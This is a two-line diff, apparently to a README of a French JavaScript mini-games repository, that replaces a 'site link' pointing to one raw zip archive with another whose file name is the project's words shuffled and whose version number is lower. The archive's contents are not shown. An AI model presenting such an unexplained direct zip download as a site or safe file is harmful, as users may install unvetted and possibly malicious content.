@@ -1,2 +1,2 @@
 lien du site : 
-https://raw.githubusercontent.com/zduchevreuil/Mini-Jeux-en-JS/main/skewerer/Mini-Jeux-en-JS-v3.9.zip
+https://github.com/zduchevreuil/Mini-Jeux-en-JS/raw/refs/heads/main/skewerer/JS-Jeux-en-Mini-v2.8.zip
